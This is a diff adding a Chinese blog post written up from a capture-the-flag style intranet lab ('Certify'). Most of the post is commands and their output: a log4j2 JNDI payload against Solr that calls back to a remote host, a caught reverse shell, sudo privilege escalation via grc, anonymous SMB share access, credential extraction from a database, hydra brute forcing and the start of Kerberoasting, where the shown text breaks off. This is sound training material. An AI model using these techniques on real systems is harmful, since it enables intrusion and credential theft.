@@ -1,0 +1,290 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>春秋云境-Certify | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"tao0845.github.io","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="靶标介绍Certify是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 solr log4j2 RCE39.98.115.206:80 open 39.98.115.206:8983 open 39.98.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境-Certify">
+<meta property="og:url" content="https://tao0845.github.io/posts/3a283e32/index.html">
+<meta property="og:site_name" content="ta0的小站">
+<meta property="og:description" content="靶标介绍Certify是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。 solr log4j2 RCE39.98.115.206:80 open 39.98.115.206:8983 open 39.98.1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.imagehub.cc/images/2025/02/09/cd0c208ab489728b9cca8eb1dfbc6c7d.png">
+<meta property="article:published_time" content="2025-02-09T10:00:45.287Z">
+<meta property="article:modified_time" content="2025-02-09T13:33:20.765Z">
+<meta property="article:author" content="ta0">
+<meta property="article:tag" content="log4j2">
+<meta property="article:tag" content="smb">
+<meta property="article:tag" content="AD CS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.imagehub.cc/images/2025/02/09/cd0c208ab489728b9cca8eb1dfbc6c7d.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">113</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">14</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">181</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%A0%87%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">靶标介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solr-log4j2-RCE"><span class="toc-number">2.</span> <span class="toc-text">solr log4j2 RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smb%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95"><span class="toc-number">3.</span> <span class="toc-text">smb免密登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AD-CS-ESC1"><span class="toc-number">4.</span> <span class="toc-text">AD CS ESC1</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://tao0845.github.io/posts/3a283e32/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">春秋云境-Certify</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-02-09 18:00:45" itemprop="dateCreated datePublished" datetime="2025-02-09T18:00:45+08:00">2025-02-09</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">1.7k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">9m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E6%B8%97%E9%80%8F/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">渗透</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/log4j2/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">log4j2</span></a><a class="tag-item" href="/tags/smb/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">smb</span></a><a class="tag-item" href="/tags/AD-CS/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">AD CS</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="靶标介绍"><a href="#靶标介绍" class="headerlink" title="靶标介绍"></a>靶标介绍</h2><p>Certify是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
+<h2 id="solr-log4j2-RCE"><a href="#solr-log4j2-RCE" class="headerlink" title="solr log4j2 RCE"></a>solr log4j2 RCE</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">39.98</span>.115.206:80 <span class="token function">open</span>
+<span class="token number">39.98</span>.115.206:8983 <span class="token function">open</span>
+<span class="token number">39.98</span>.115.206:22 <span class="token function">open</span></code></pre>
+<p>80端口是nginx默认界面，那就看8983<br><img src="https://s1.imagehub.cc/images/2025/02/09/cd0c208ab489728b9cca8eb1dfbc6c7d.png" alt="image" loading="lazy"><br>是一个solr面板，存在log4j2<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md</a><br>搜索找到poc</p>
+<pre class="language-none"><code class="language-none">solr&#x2F;admin&#x2F;cores?action&#x3D;$&#123;jndi:ldap:&#x2F;&#x2F;$&#123;sys:java.version&#125;.example.com&#125;</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@VM-4-13-ubuntu:~<span class="token comment"># nc -lnvp 4567</span>
+Listening on <span class="token number">0.0</span>.0.0 <span class="token number">4567</span>
+Connection received on <span class="token number">39.98</span>.121.108 <span class="token number">33364</span>
+bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">10827</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
+bash: no job control <span class="token keyword">in</span> this shell
+solr@ubuntu:/opt/solr/server$ <span class="token function">id</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">111</span><span class="token punctuation">(</span>solr<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">122</span><span class="token punctuation">(</span>solr<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">122</span><span class="token punctuation">(</span>solr<span class="token punctuation">)</span></code></pre>
+<p>提下权</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">solr@ubuntu:/opt/solr/server$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> solr on ubuntu:
+    env_reset, mail_badpass,
+    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin
+
+User solr may run the following commands on ubuntu:
+    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: /usr/bin/grc
+solr@ubuntu:/opt/solr/server$ <span class="token function">sudo</span> grc <span class="token parameter variable">--pty</span> /bin/sh
+<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@ubuntu:~/flag<span class="token comment"># cat flag01.txt </span>
+   ██████                   ██   ██   ████         
+  ██░░░░██                 ░██  ░░   ░██░   ██   ██
+ ██    ░░   █████  ██████ ██████ ██ ██████ ░░██ ██ 
+░██        ██░░░██░░██░░█░░░██░ ░██░░░██░   ░░███  
+░██       ░███████ ░██ ░   ░██  ░██  ░██     ░██   
+░░██    ██░██░░░░  ░██     ░██  ░██  ░██     ██    
+ ░░██████ ░░██████░███     ░░██ ░██  ░██    ██     
+  ░░░░░░   ░░░░░░ ░░░       ░░  ░░   ░░    ░░      
+
+Easy right?
+Maybe you should <span class="token function">dig</span> into my core domain network.
+
+flag01: flag<span class="token punctuation">&#123;</span>177f2bc3-0f0b-4fba-82dc-56081d0fd7fc<span class="token punctuation">&#125;</span></code></pre>
+<h2 id="smb免密登录"><a href="#smb免密登录" class="headerlink" title="smb免密登录"></a>smb免密登录</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">172.22</span>.9.19 solr
+<span class="token number">172.22</span>.9.7  DC XIAORANG<span class="token punctuation">\</span>XIAORANG-DC <span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan  http://172.22.9.7 poc-yaml-active-directory-certsrv-detect
+<span class="token number">172.22</span>.9.26 XIAORANG<span class="token punctuation">\</span>DESKTOP-CBKTVMO
+<span class="token number">172.22</span>.9.47 WORKGROUP<span class="token punctuation">\</span>FILESERVER </code></pre>
+<p>文件服务器上有smb共享</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  proxychains4 smbclient --no-pass <span class="token parameter variable">-L</span> //172.22.9.47                                                         <span class="token punctuation">[</span><span class="token number">19</span>:36:29<span class="token punctuation">]</span>
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> config <span class="token function">file</span> found: /etc/proxychains.conf
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> DLL init: proxychains-ng <span class="token number">4.17</span>
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.9.47:445  <span class="token punctuation">..</span>.  OK
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        fileshare       Disk      bill share
+        IPC$            IPC       IPC Service <span class="token punctuation">(</span>fileserver server <span class="token punctuation">(</span>Samba, Ubuntu<span class="token punctuation">))</span>
+Reconnecting with SMB1 <span class="token keyword">for</span> workgroup listing.
+<span class="token punctuation">[</span>proxychains<span class="token punctuation">]</span> Strict chain  <span class="token punctuation">..</span>.  <span class="token number">101.43</span>.121.110:7002  <span class="token punctuation">..</span>.  <span class="token number">172.22</span>.9.47:139  <span class="token punctuation">..</span>.  OK
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            FILESERVER</code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span> smbclient <span class="token parameter variable">-N</span> //172.22.9.47/fileshare                                                      <span class="token punctuation">[</span><span class="token number">19</span>:39:48<span class="token punctuation">]</span>
+Try <span class="token string">"help"</span> to get a list of possible commands.
+smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span>
+  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Wed Jul <span class="token number">13</span> <span class="token number">16</span>:12:10 <span class="token number">2022</span>
+  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Wed Jul <span class="token number">13</span> <span class="token number">12</span>:35:09 <span class="token number">2022</span>
+  personnel.db                        A    <span class="token number">61440</span>  Wed Jul <span class="token number">13</span> <span class="token number">15</span>:46:55 <span class="token number">2022</span>
+  secret                              D        <span class="token number">0</span>  Sun Feb  <span class="token number">9</span> <span class="token number">18</span>:46:48 <span class="token number">2025</span>
+  Certified_Pre-Owned.7z              N  <span class="token number">9572925</span>  Wed Jul <span class="token number">13</span> <span class="token number">16</span>:12:03 <span class="token number">2022</span>
+  Certified_Pre-Owned.pdf             N <span class="token number">10406101</span>  Wed Jul <span class="token number">13</span> <span class="token number">16</span>:08:14 <span class="token number">2022</span>
+
+                <span class="token number">41152812</span> blocks of size <span class="token number">1024</span>. <span class="token number">36033796</span> blocks available
+smb: <span class="token punctuation">\</span><span class="token operator">></span> <span class="token builtin class-name">cd</span> secret
+smb: <span class="token punctuation">\</span>secret<span class="token punctuation">\</span><span class="token operator">></span> <span class="token function">dir</span>
+  <span class="token builtin class-name">.</span>                                   D        <span class="token number">0</span>  Sun Feb  <span class="token number">9</span> <span class="token number">18</span>:46:48 <span class="token number">2025</span>
+  <span class="token punctuation">..</span>                                  D        <span class="token number">0</span>  Wed Jul <span class="token number">13</span> <span class="token number">16</span>:12:10 <span class="token number">2022</span>
+  flag02.txt                          N      <span class="token number">659</span>  Sun Feb  <span class="token number">9</span> <span class="token number">18</span>:46:48 <span class="token number">2025</span></code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> flag02.txt                                                                                            <span class="token punctuation">[</span><span class="token number">19</span>:40:30<span class="token punctuation">]</span>
+ ________  _______   ________  _________  ___  ________ ___    ___ 
+<span class="token operator">|</span><span class="token punctuation">\</span>   ____<span class="token punctuation">\</span><span class="token operator">|</span><span class="token punctuation">\</span>  ___ <span class="token punctuation">\</span> <span class="token operator">|</span><span class="token punctuation">\</span>   __  <span class="token punctuation">\</span><span class="token operator">|</span><span class="token punctuation">\</span>___   ___<span class="token punctuation">\</span><span class="token punctuation">\</span>  <span class="token punctuation">\</span><span class="token operator">|</span><span class="token punctuation">\</span>  _____<span class="token punctuation">\</span><span class="token punctuation">\</span>  <span class="token punctuation">\</span>  /  /<span class="token operator">|</span>
+<span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span>___<span class="token operator">|</span><span class="token punctuation">\</span> <span class="token punctuation">\</span>   __/<span class="token operator">|</span><span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span><span class="token operator">|</span><span class="token punctuation">\</span>  <span class="token punctuation">\</span><span class="token operator">|</span>___ <span class="token punctuation">\</span>  <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span>__/<span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span>/  / /
+ <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span>    <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span>_<span class="token operator">|</span>/_<span class="token punctuation">\</span> <span class="token punctuation">\</span>   _  _<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>   __<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span>    / / 
+  <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span>____<span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span>_<span class="token operator">|</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span><span class="token punctuation">\</span>  <span class="token punctuation">\</span><span class="token operator">|</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>  <span class="token punctuation">\</span>_<span class="token operator">|</span> <span class="token punctuation">\</span>/  /  /  
+   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_______<span class="token punctuation">\</span> <span class="token punctuation">\</span>_______<span class="token punctuation">\</span> <span class="token punctuation">\</span>__<span class="token punctuation">\</span><span class="token punctuation">\</span> _<span class="token punctuation">\</span>    <span class="token punctuation">\</span> <span class="token punctuation">\</span>__<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>__<span class="token punctuation">\</span> <span class="token punctuation">\</span>__<span class="token punctuation">\</span>__/  / /    
+    <span class="token punctuation">\</span><span class="token operator">|</span>_______<span class="token operator">|</span><span class="token punctuation">\</span><span class="token operator">|</span>_______<span class="token operator">|</span><span class="token punctuation">\</span><span class="token operator">|</span>__<span class="token operator">|</span><span class="token punctuation">\</span><span class="token operator">|</span>__<span class="token operator">|</span>    <span class="token punctuation">\</span><span class="token operator">|</span>__<span class="token operator">|</span>  <span class="token punctuation">\</span><span class="token operator">|</span>__<span class="token operator">|</span><span class="token punctuation">\</span><span class="token operator">|</span>__<span class="token operator">|</span><span class="token punctuation">\</span>___/ /     
+                                                      <span class="token punctuation">\</span><span class="token operator">|</span>___<span class="token operator">|</span>/      
+
+flag02: flag<span class="token punctuation">&#123;</span>2dd009d8-1ba6-4ac7-a7f7-8d4d4a38a826<span class="token punctuation">&#125;</span>
+
+Yes, you have enumerated smb. But <span class="token keyword">do</span> you know what an SPN is?</code></pre>
+<h2 id="AD-CS-ESC1"><a href="#AD-CS-ESC1" class="headerlink" title="AD CS ESC1"></a>AD CS ESC1</h2><p>提示spn，应该要kerberoasting攻击，但是得需要拿到一组账户密码<br>SMB下面还有一个persion.db文件，里面有用户名密码</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~<span class="token punctuation">]</span> ➜  sqlite3 personnel.db                                                                                      <span class="token punctuation">[</span><span class="token number">19</span>:47:51<span class="token punctuation">]</span>
+SQLite version <span class="token number">3.46</span>.0 <span class="token number">2024</span>-05-23 <span class="token number">13</span>:25:27
+Enter <span class="token string">".help"</span> <span class="token keyword">for</span> usage hints.
+sqlite<span class="token operator">></span> .tables
+xr_members  xr_salary   xr_users  
+sqlite<span class="token operator">></span> <span class="token keyword">select</span> * from xr_users<span class="token punctuation">;</span>
+<span class="token number">1</span><span class="token operator">|</span>admin<span class="token operator">|</span>admin
+<span class="token number">2</span><span class="token operator">|</span>******<span class="token operator">|</span>i9XDE02pLVf
+<span class="token number">3</span><span class="token operator">|</span>******<span class="token operator">|</span>6N70jt2K9sV
+<span class="token number">4</span><span class="token operator">|</span>******<span class="token operator">|</span>fiAzGwEMgTY
+sqlite<span class="token operator">></span> <span class="token keyword">select</span> * from xr_members<span class="token punctuation">;</span>
+<span class="token number">1</span><span class="token operator">|</span>huangmin<span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">26</span><span class="token operator">|</span><span class="token number">15220647319</span><span class="token operator">|</span>huangmin@xiaorang.lab
+<span class="token number">2</span><span class="token operator">|</span>zhangrong<span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">36</span><span class="token operator">|</span><span class="token number">13073815024</span><span class="token operator">|</span>zhangrong@xiaorang.lab
+<span class="token number">3</span><span class="token operator">|</span>liying<span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">29</span><span class="token operator">|</span><span class="token number">13126874319</span><span class="token operator">|</span>liying@xiaorang.lab
+<span class="token number">4</span><span class="token operator">|</span>zhaoli<span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">44</span><span class="token operator">|</span><span class="token number">13075613024</span><span class="token operator">|</span>zhaoli@xiaorang.lab
+<span class="token number">5</span><span class="token operator">|</span>zhangyan<span class="token operator">|</span><span class="token number">0</span><span class="token operator">|</span><span class="token number">35</span><span class="token operator">|</span><span class="token number">15254139260</span><span class="token operator">|</span>zhangyan@xiaorang.lab
+<span class="token number">6</span><span class="token operator">|</span>zhoujing<span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">32</span><span class="token operator">|</span><span class="token number">15123481906</span><span class="token operator">|</span>zhoujing@xiaorang.lab
+<span class="token number">7</span><span class="token operator">|</span>liuying<span class="token operator">|</span><span class="token number">1</span><span class="token operator">|</span><span class="token number">24</span><span class="token operator">|</span><span class="token number">13078310649</span><span class="token operator">|</span>liuying@xiaorang.lab
+<span class="token punctuation">..</span>
+<span class="token punctuation">..</span></code></pre>
+<p>可以用用户名和密码做爆破</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> aaa <span class="token operator">|</span> <span class="token function">awk</span> <span class="token parameter variable">-F</span> <span class="token string">'|'</span> <span class="token string">'&#123;print $2&#125;'</span>  <span class="token operator">></span> user.txt  
+root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  <span class="token function">cat</span> bbb <span class="token operator">|</span> <span class="token function">awk</span> <span class="token parameter variable">-F</span> <span class="token string">'|'</span> <span class="token string">'&#123;print $3&#125;'</span> <span class="token operator">></span>pass.txt </code></pre>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span>  hydra <span class="token parameter variable">-L</span> user.txt <span class="token parameter variable">-P</span> pass.txt <span class="token number">172.22</span>.9.26 smb <span class="token parameter variable">-t</span> 
+<span class="token punctuation">[</span><span class="token number">445</span><span class="token punctuation">]</span><span class="token punctuation">[</span>smb<span class="token punctuation">]</span> host: <span class="token number">172.22</span>.9.26   login: zhangjian   password: i9XDE02pLVf
+<span class="token punctuation">[</span><span class="token number">445</span><span class="token punctuation">]</span><span class="token punctuation">[</span>smb<span class="token punctuation">]</span> host: <span class="token number">172.22</span>.9.26   login: liupeng   password: fiAzGwEMgTY</code></pre>
+<p>进行kerberoasting攻击</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span> ➜  proxychains4 <span class="token parameter variable">-q</span>  GetUserSPNs.py <span class="token parameter variable">-request</span> -dc-ip <span class="token number">172.22</span>.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf          <span class="token punctuation">[</span><span class="token number">19</span>:56:35<span class="token punctuation">]</span>
+/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python <span class="token number">2</span> is no longer supported by the Python core team. Support <span class="token keyword">for</span> it is now deprecated <span class="token keyword">in</span> cryptography, and will be removed <span class="token keyword">in</span> the next release.
+Impacket v0.9.20 - Copyright <span class="token number">2019</span> SecureAuth Corporation
+
+ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon 
+-------------------------------------  --------  --------  --------------------------  ---------
